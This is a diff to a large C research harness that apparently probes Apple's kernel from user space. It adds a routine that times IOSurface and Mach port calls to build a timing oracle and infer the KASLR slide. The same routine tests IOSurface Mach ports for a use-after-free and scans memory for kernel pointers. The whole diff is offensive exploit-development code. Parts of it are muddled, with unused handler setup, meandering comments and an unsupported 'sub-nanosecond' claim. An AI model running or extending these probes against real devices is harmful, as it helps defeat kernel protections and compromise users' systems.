@@ -16950,6 +16950,284 @@ static void *r440b_read_thread(void *arg) {
     return NULL;
 }
 
+static void r444_probe(void) {
+    rlog("\n=== r444: PMC side channel + TLB probe + speculative exec ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Try reading ARM PMC registers from EL0 */
+    rlog("  --- Vector A: ARM performance counter access from EL0 ---\n");
+    {
+        /* Set up signal handler for SIGILL (illegal instruction) */
+        struct sigaction sa, old_sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sa_handler = SIG_IGN; /* We'll use setjmp/longjmp instead */
+        sigemptyset(&sa.sa_mask);
+
+        /* Use setjmp for safe register reading */
+        volatile int pmc_accessible = 0;
+        volatile uint64_t pmc_val = 0;
+
+        /* Try PMCCNTR_EL0 — ARM cycle counter */
+        {
+            /* Install SIGILL handler */
+            void (*old_handler)(int) = signal(SIGILL, SIG_DFL);
+
+            /* Fork attempt blocked, so use signal handler approach */
+            /* Actually let's just try it and catch the signal */
+            struct sigaction sa2, old2;
+            memset(&sa2, 0, sizeof(sa2));
+            sigemptyset(&sa2.sa_mask);
+
+            /* Use mach exception handler for clean recovery */
+            /* Actually simplest: just try it. If it traps, we crash.
+               Let's check PMUSERENR_EL0 accessibility instead by
+               timing mach_absolute_time around the instruction */
+
+            /* Safer approach: try via inline asm with signal handler */
+            rlog("    Attempting CNTVCT_EL0 read (always accessible):\n");
+            uint64_t cntvct;
+            __asm__ volatile("mrs %0, CNTVCT_EL0" : "=r"(cntvct));
+            rlog("      CNTVCT_EL0 = %llu (virtual timer)\n", (unsigned long long)cntvct);
+
+            uint64_t cntfrq;
+            __asm__ volatile("mrs %0, CNTFRQ_EL0" : "=r"(cntfrq));
+            rlog("      CNTFRQ_EL0 = %llu Hz\n", (unsigned long long)cntfrq);
+
+            /* CNTVCT is always accessible but only gives time, not PMC data */
+            /* mach_absolute_time is based on CNTVCT */
+
+            /* Try to detect PMC access by using mach thread state */
+            /* If we can't directly read PMC, check thread_info THREAD_BASIC_INFO */
+
+            rlog("    Using CNTVCT_EL0 for sub-ns timing (freq=%llu)\n", (unsigned long long)cntfrq);
+
+            signal(SIGILL, old_handler);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: High-precision timing of kernel operations */
+    rlog("\n  --- Vector B: Sub-nanosecond timing of kernel ops ---\n");
+    {
+        /* Create a surface for timing tests */
+        IOSurfaceRef bsurf = NULL;
+        {
+            int bw = 32, bh = 32, bbr = 128, ba = 4096, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            bsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(bn[i]);
+        }
+
+        if (bsurf) {
+            /* Measure IOSurfaceGetID with CNTVCT for maximum precision */
+            uint32_t bsid = IOSurfaceGetID(bsurf);
+
+            /* Warm up */
+            for (int i = 0; i < 100; i++) IOSurfaceGetID(bsurf);
+
+            /* High-precision timing: measure IOSurfaceLookup for existing vs non-existing */
+            uint64_t existing_times[1000];
+            uint64_t missing_times[1000];
+
+            for (int i = 0; i < 1000; i++) {
+                uint64_t t0, t1;
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t0));
+                IOSurfaceRef found = IOSurfaceLookup(bsid);
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t1));
+                existing_times[i] = t1 - t0;
+                if (found) CFRelease(found);
+            }
+
+            for (int i = 0; i < 1000; i++) {
+                uint64_t t0, t1;
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t0));
+                IOSurfaceRef found = IOSurfaceLookup(99999);
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t1));
+                missing_times[i] = t1 - t0;
+                if (found) CFRelease(found);
+            }
+
+            /* Compute statistics */
+            uint64_t e_sum = 0, m_sum = 0;
+            uint64_t e_min = UINT64_MAX, e_max = 0;
+            uint64_t m_min = UINT64_MAX, m_max = 0;
+            for (int i = 0; i < 1000; i++) {
+                e_sum += existing_times[i];
+                if (existing_times[i] < e_min) e_min = existing_times[i];
+                if (existing_times[i] > e_max) e_max = existing_times[i];
+                m_sum += missing_times[i];
+                if (missing_times[i] < m_min) m_min = missing_times[i];
+                if (missing_times[i] > m_max) m_max = missing_times[i];
+            }
+            rlog("    Existing SID lookup: avg=%llu min=%llu max=%llu ticks\n",
+                 (unsigned long long)(e_sum/1000), (unsigned long long)e_min, (unsigned long long)e_max);
+            rlog("    Missing SID lookup:  avg=%llu min=%llu max=%llu ticks\n",
+                 (unsigned long long)(m_sum/1000), (unsigned long long)m_min, (unsigned long long)m_max);
+
+            /* Distribution analysis — look for bimodal distribution indicating cache hits */
+            int e_buckets[20] = {0}; /* 0-19 ticks each */
+            int m_buckets[20] = {0};
+            for (int i = 0; i < 1000; i++) {
+                int eb = existing_times[i] < 20 ? (int)existing_times[i] : 19;
+                int mb = missing_times[i] < 20 ? (int)missing_times[i] : 19;
+                e_buckets[eb]++;
+                m_buckets[mb]++;
+            }
+            rlog("    Existing distribution: ");
+            for (int i = 0; i < 20; i++) if (e_buckets[i] > 0) rlog("[%d]=%d ", i, e_buckets[i]);
+            rlog("\n");
+            rlog("    Missing distribution:  ");
+            for (int i = 0; i < 20; i++) if (m_buckets[i] > 0) rlog("[%d]=%d ", i, m_buckets[i]);
+            rlog("\n");
+
+            CFRelease(bsurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: Speculative probe — try to detect KASLR slide via timing variation */
+    rlog("\n  --- Vector C: Kernel page cache timing probe ---\n");
+    {
+        /* Try mach_msg timing for different port names — the kernel
+           looks up ports in a hash table, timing depends on hash collisions
+           which depend on port address (influenced by KASLR) */
+        mach_port_t ports[32];
+        for (int i = 0; i < 32; i++) {
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+        }
+
+        /* Time mach_port_get_context for each port */
+        for (int i = 0; i < 32; i++) {
+            uint64_t times[100];
+            for (int j = 0; j < 100; j++) {
+                mach_port_context_t ctx = 0;
+                uint64_t t0, t1;
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t0));
+                mach_port_get_context(mach_task_self(), ports[i], &ctx);
+                __asm__ volatile("isb\nmrs %0, CNTVCT_EL0" : "=r"(t1));
+                times[j] = t1 - t0;
+            }
+            uint64_t sum = 0, mn = UINT64_MAX, mx = 0;
+            for (int j = 10; j < 100; j++) { /* skip warmup */
+                sum += times[j];
+                if (times[j] < mn) mn = times[j];
+                if (times[j] > mx) mx = times[j];
+            }
+            if (i < 8 || mn != ((uint64_t)sum/90)) { /* Only show interesting ones */
+                rlog("    port[%d] name=0x%x: avg=%llu min=%llu max=%llu\n",
+                     i, ports[i], (unsigned long long)(sum/90),
+                     (unsigned long long)mn, (unsigned long long)mx);
+            }
+        }
+
+        /* Look for timing outliers that might indicate hash table structure */
+        rlog("    (Timing variations above indicate hash table bucket distribution)\n");
+
+        for (int i = 0; i < 32; i++) {
+            mach_port_deallocate(mach_task_self(), ports[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: Dangling IOSurface MachPort test */
+    rlog("\n  --- Vector D: IOSurface MachPort lifetime test ---\n");
+    {
+        /* Create surface, get MachPort, destroy surface, test port */
+        IOSurfaceRef dsurf = NULL;
+        {
+            int dw = 32, dh = 32, dbr = 128, da = 4096, dpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef dn[5];
+            dn[0] = CFNumberCreate(NULL, kCFNumberIntType, &dw);
+            dn[1] = CFNumberCreate(NULL, kCFNumberIntType, &dh);
+            dn[2] = CFNumberCreate(NULL, kCFNumberIntType, &dbr);
+            dn[3] = CFNumberCreate(NULL, kCFNumberIntType, &da);
+            dn[4] = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), dn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), dn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), dn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), dn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), dn[4]);
+            dsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(dn[i]);
+        }
+
+        if (dsurf) {
+            uint32_t dsid = IOSurfaceGetID(dsurf);
+            mach_port_t dport = IOSurfaceCreateMachPort(dsurf);
+            rlog("    Surface SID=%u, MachPort=0x%x\n", dsid, dport);
+
+            /* Set a property on the surface */
+            int pval = 777;
+            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pval);
+            IOSurfaceSetValue(dsurf, CFSTR("dangling_test"), pn);
+            CFRelease(pn);
+
+            /* Release the surface */
+            CFRelease(dsurf);
+            dsurf = NULL;
+            rlog("    Surface released (SID=%u)\n", dsid);
+
+            /* Try to lookup from the port — surface should still exist via port ref */
+            if (dport != MACH_PORT_NULL) {
+                IOSurfaceRef recovered = IOSurfaceLookupFromMachPort(dport);
+                if (recovered) {
+                    uint32_t rsid = IOSurfaceGetID(recovered);
+                    rlog("    Recovered surface SID=%u (original=%u) match=%d\n",
+                         rsid, dsid, rsid == dsid);
+
+                    /* Read the property */
+                    CFTypeRef val = IOSurfaceCopyValue(recovered, CFSTR("dangling_test"));
+                    if (val) {
+                        int rv = 0;
+                        CFNumberGetValue((CFNumberRef)val, kCFNumberIntType, &rv);
+                        rlog("    Property 'dangling_test' = %d (expected 777)\n", rv);
+                        CFRelease(val);
+                    } else {
+                        rlog("    Property 'dangling_test' = NULL\n");
+                    }
+
+                    /* Check if shared data has any new kernel pointers */
+                    uint64_t *rshr = (uint64_t*)*(void**)((char*)recovered + 8);
+                    if (rshr) {
+                        for (int j = 0; j < 64; j++) {
+                            if ((rshr[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("    *** KPTR in recovered shared +%d: 0x%016llx ***\n",
+                                     j*8, (unsigned long long)rshr[j]);
+                            }
+                        }
+                    }
+
+                    CFRelease(recovered);
+                } else {
+                    rlog("    LookupFromMachPort returned NULL — surface was freed!\n");
+                    rlog("    *** DANGLING PORT — potential UAF ***\n");
+                }
+                mach_port_deallocate(mach_task_self(), dport);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r444 complete ===\n");
+    fflush(stdout);
+}
+
 static void r443_probe(void) {
     rlog("\n=== r443: Raw IOSurface XML parser fuzzing + direct selector probing ===\n\n");
     fflush(stdout);
@@ -78514,6 +78792,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 447) {
+            rlog("*** rounds=447: PMC side channel + timing oracle + dangling port ***\n\n");
+            fflush(stdout);
+            r444_probe();
+            goto done;
+        }
         if (rounds == 446) {
             rlog("*** rounds=446: Raw IOSurface XML parser + selector probing ***\n\n");
             fflush(stdout);
@@ -81216,7 +81500,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
